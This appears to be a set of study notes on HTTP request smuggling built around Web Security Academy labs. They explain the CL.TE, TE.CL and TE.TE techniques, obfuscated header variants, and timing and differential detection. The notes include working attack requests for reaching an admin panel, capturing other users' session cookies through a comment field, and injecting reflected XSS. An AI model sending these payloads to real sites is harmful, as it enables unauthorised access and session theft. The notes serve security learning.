# What is HTTP request smuggling?

HTTP request smuggling interferes with the way a website processes sequences of HTTP requests. The vulnerabilities are often critical.
This can happen because requests are often first met at the front-end (load balancer/reverse proxy etc.), then the back-end.
It is important that the front and back end systems agree about the boundaries between requests. If not, attackers can "inject" parts of their own HTTP request into the next request:

![12d2562bab1e4ff068c1fa81914a820b.png](../../_resources/12d2562bab1e4ff068c1fa81914a820b-1.png)

# How does it work?

The HTTP spec provides two different ways of specifying where a request ends: the `Content-Length` and `Transfer-Encoding` headers.

The `Content-Length` header specifies the length of the message body in bytes.

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling 
```

The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding, meaning that the message body contains one or more chunks of data. Each chunk contains the chunk size in bytes (in hexadecimal), followed by a newline containing the chunk contents. The message is then terminated with a chunk size of zero.

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

It is possible for a single request to use both methods, but this can cause problems when two servers are at play.

- Some servers don't support `Transfer-Encoding`
- Some servers that support the `Transfer-Encoding` header can be induced not to process it if the header is obfuscated.

# How to perform HTTP request smuggling

Request smuggling attacks make use of both the `Content-Length` and `Transfer-Encoding` headers so that the frontend and backend servers process the request differently.

- CL.TE: the frontend server uses the CL header, backend uses TE
- TE.CL: frontend uses TE, backend uses CL
- TE.TE: frontend and backend both support TE, but one of the servers can be induced not to process it by obfuscating the header

> Pro Tip: Use the HTTP Request Smuggler Burp extension

## Burp Plugin: HTTP Request Smuggler Quick Guide

https://github.com/PortSwigger/http-request-smuggler

1.  Use the Extender->BApp store tab to install the 'HTTP Request Smuggler' extension.
2.  Load the lab homepage, find the request in the proxy history, right click and select 'Launch smuggle probe', then click 'OK'.
3.  Wait for the probe to complete, indicated by 'Completed 1 of 1' appearing in the extension's output tab.
4.  If you're using Burp Suite Pro, find the reported vulnerability in the dashboard and open the first attached request.
5.  If you're using Burp Suite Community, copy the (first) request from the output tab and paste it into the repeater, then complete the 'Target' details on the top right.
6.  Right click on the request and select 'Smuggle attack (CL.TE)'.
7.  Change the value of the 'prefix' variable to 'G', then click 'Attack' and confirm that one response says 'Unrecognised method GPOST'.

By changing the 'prefix' variable in step 7, you can solve all the labs and virtually every real-world scenario.

**IMPORTANT**: When copy-pasting the request from the output, make sure to include ALL the newlines in the request as shown on the output.

## CL.TE

Frontend processes the CL header and forwards the entire message to the backend. Backend processes the request, sees the zero and terminates the request. Then the SMUGGLED is treated as the start of the next request.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

> Note: the 13 could be any arbitrary number

Notice that the `Content-Length` is specified as 13 because it counts the CRLF bytes `\r\n` for newlines (besides the apparent newline separating the headers from the message body):

```
...
Content-Length: 13
Transfer-Encoding: chunked

0\r\n           <- 3 bytes
\r\n            <- 2 bytes
SMUGGLED        <- 8 bytes
                == 13 bytes total
```

Actual example:

![c372d5f2a98a223b4ad8c17250d19036.png](../../_resources/c372d5f2a98a223b4ad8c17250d19036-1.png)

## TE.CL

Frontend processes TE header and processes the first 8 byte chunk (line including "SMUGGLED"). It processes the 0, which terminates the request. Then, the request is forwarded to the backend. The backend processes the CL and processes the 3 bytes (line containing "8"). The following bytes, starting with "SMUGGLED", are unprocessed and are treated as the start of the next request.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**IMPORTANT**: You might have to uncheck the "Update Content-Length" option in Repeater.
Also include the trailing sequence `\r\n\r\n` after the final 0

Actual example:

![f03def6e93813a6be3094388b5f00606.png](../../_resources/f03def6e93813a6be3094388b5f00606-1.png)

## TE.TE

Both front and backend support TE, but one can be induced not to process it by obfuscating the header.

Obfuscated examples:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Find a variation of the header such that only one of the servers processes it, while the other server ignores it.
Depending on which server can be induced not to process the obfuscated header, the attack will be like the CL.TE or TE.CL vulnerabilities.

# Finding request smuggling vulns using timing techniques

## Finding CL.TE vulns using timing

Sending this might cause a time delay:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X 
```

Since the frontend uses the CL header, it will forward only part of the request, omitting the X. The backend uses TE, so it processes the first chunk and waits for the next chunk to arrive, causing a time delay.

## Finding TE.CL vulns using timing

Sending this might cause a time delay:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X 
```

Since the frontend uses TE, it only forwards part of the request, omitting the X. The backend uses CL, expects more from the message body and waits for the content to arrive, causing a time delay.

# Confirming request smuggling vulns using differential responses

You can exploit to trigger differences in the responses. This usually involves sending two requests in quick succession:

- An attack request designed to interfere with processing the next request
- A normal request

Suppose that the normal request looks like this (HTTP status code 200 response):

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling 
```

The attack request depends on what kind of request smuggling it is.

## Confirming CL.TE using differential responses

Send an attack request like:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x 
```

Then, the normal request would be affected as such:

![706e5b0dd641486618f134d5e4776b02.png](../../_resources/706e5b0dd641486618f134d5e4776b02-1.png)

Since the request contains an invalid URL, the server will respond with status code 404, indicating that a request smuggling vuln is present.

## Confirming TE.CL using differential responses

Send an attack request like:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

Then, the normal request would be affected as such:

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling 
```

Notice that the whole normal request (the POST) is "encapsulated" within the declared message body (starting with the first `x=`) of the attack request (the GET), so the normal request is ignored. Since this new request contains an invalid URL, the server will respond with status code 404, indicating that a request smuggling vuln is present.

# Exploiting request smuggling vulns

## Bypassing frontend security controls

Some applications use a frontend server to validate requests, then the allowed requests are forwarded to the backend server. In this case, request smuggling can be used to bypass access controls by smuggling a request to a restricted URL.

For example, if the user can access `/home` but not `/admin`, the following request can be made to smuggle the request for `/admin`:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com 
```

### Solution for CL.TE lab explained: 
Because the `/admin` panel needs to be accessed by local users, spoofing the `Host` header to `localhost` is required. 
However, if the following request is issued twice (to smuggle the `GET /admin`), it doesn't work because the next ("normal") request (affected by the smuggled request) will ALSO have a `Host` header, resulting in an error of duplicate headers:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

Therefore, to "hide" the `Host` header in the next request, we attempt to hide the entire "normal" request in the smuggled request's message body. This way, only the `Host: localhost` header is seen, and the other headers in the normal request are encapsulated within the message body and are not treated as headers.

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

## Revealing front-end request rewriting
Sometimes, an app will rewrite requests in the frontend before forwarding it to the backend, typically by adding some headers. Your smuggled requests may not work unless you know how the frontend is rewriting the requests. 

There is a way to reveal how the frontend rewrites requests: 
- Find a POST request that reflects the value of a request parameter into the response
- Move the parameters such that the reflected parameter appears last in the message body
- Smuggle the request to the backend, followed by a normal request that you are interested in revealing

Example: 
If an application reflects the `email` parameter, you can use request smuggling to reveal the rewriting.

![7939aa6ea757e13cf2ebb72d14e6aabf.png](../../_resources/7939aa6ea757e13cf2ebb72d14e6aabf-1.png)

Thus, the entire rewritten request (in green) is reflected and revealed. 

**IMPORTANT**: The `Content-Length` of the smuggled request ("100" in the above example) often determines how much of the normal request is revealed. Increment this wisely so as to not timeout the server.

## Bypassing client authentication
Sometimes, a TLS authentication requires that a client provide a certificate to the server. This certificate contains a CN "common name" that is often a username (in the client's case). Frontend servers sometimes append a non-standard header containing the client's CN that may be trusted. In practice, this is not usually exploitable because the frontend always overwrites the headers, but smuggled requests are hidden from the frontend, so the authentication on the backend can be bypassed.

![91cd0cf700a1797fb49ee7067a19fc65.png](../../_resources/91cd0cf700a1797fb49ee7067a19fc65-1.png)

## Capturing other users' requests
If the app has functionality to store and retrieve data (text), HTTP request smuggling can be used to capture other users' requests. Examples of such functions: comments, emails, profile descriptions, display names, etc.

Smuggle a request that submits data to the storage function with the parameter containing the data positioned last in the request. 

Suppose an app has a comment function. 
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net 
```

The parameter that contains the data is `comment`, so position it last in the smuggling attack. Remember that you might need to change the smuggled request's `Content-Length`

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

When another user's request is processed by the backend, it will be appended to the smuggled request and allow exfiltration of the data (in this case, in the comment).

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

## Exploit reflected XSS
If an app is vulnerable to both request smuggling and reflected XSS, you can smuggle a request to induce XSS in other users' requests.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X


```